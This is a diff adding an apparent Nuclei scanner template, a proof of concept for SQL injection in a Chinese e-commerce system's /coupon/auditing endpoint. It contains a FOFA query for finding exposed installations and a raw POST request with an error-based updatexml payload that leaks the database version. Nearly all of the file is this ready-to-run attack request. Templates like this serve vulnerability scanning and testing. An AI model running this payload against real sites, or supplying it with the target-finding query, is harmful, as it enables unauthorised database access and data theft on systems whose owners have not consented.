@@ -1,0 +1,28 @@
+id: poc-sgfo13nqfc12qd67
+info:
+  name: 龙采商城系统auditing存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sgfo13nqfc12qd67'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sgfo13nqfc12qd67
+    fofa: body="'url':'/pc2.0/index/index'"
+http:
+- raw:
+  - 'POST /coupon/auditing HTTP/1.1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Host: {{Hostname}}
+
+    X-Requested-With: XMLHttpRequest
+
+
+    id=1%20and%20updatexml(1,concat(0x7e,@@version,0x7e),1)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
